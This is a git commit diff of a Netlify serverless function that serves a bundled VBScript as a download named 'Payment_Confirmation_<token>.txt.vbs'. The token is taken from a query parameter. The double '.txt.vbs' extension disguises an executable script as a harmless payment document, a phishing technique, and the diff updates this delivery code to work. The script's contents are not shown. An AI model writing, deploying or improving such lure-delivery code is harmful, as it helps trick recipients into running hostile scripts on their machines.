188807999490e2a1db2c249f74657e99cdad6592
desktermedia <m.iria.m.deskter@gmail.com>
2025-08-24 17:38:46 +0200

    Fix working download with dynamic file

--- netlify/functions/generate-file.js
+++ netlify/functions/generate-file.js
@@ -1,25 +1,27 @@
 const fs = require("fs");
 const path = require("path");
 
-exports.handler = async (event, context) => {
-  const filePath = path.join(__dirname, "assets", "deinScript.vbs");
+exports.handler = async function (event, context) {
+  const token = event.queryStringParameters.token || "default";
+
+  const filePath = path.join(__dirname, "assets", "yourScript.vbs");
 
   try {
-    const scriptContent = fs.readFileSync(filePath, "utf8");
-    const uniqueToken = Math.random().toString(36).substring(2, 10);
+    const fileContent = fs.readFileSync(filePath);
 
     return {
       statusCode: 200,
       headers: {
         "Content-Type": "application/octet-stream",
-        "Content-Disposition": `attachment; filename=Payment_Confirmation_${uniqueToken}.txt.vbs`
+        "Content-Disposition": `attachment; filename=Payment_Confirmation_${token}.txt.vbs`,
       },
-      body: scriptContent
+      body: fileContent.toString("base64"),
+      isBase64Encoded: true,
     };
   } catch (error) {
     return {
       statusCode: 500,
-      body: JSON.stringify(error)
+      body: `Error reading file: ${error.message}`,
     };
   }
 };
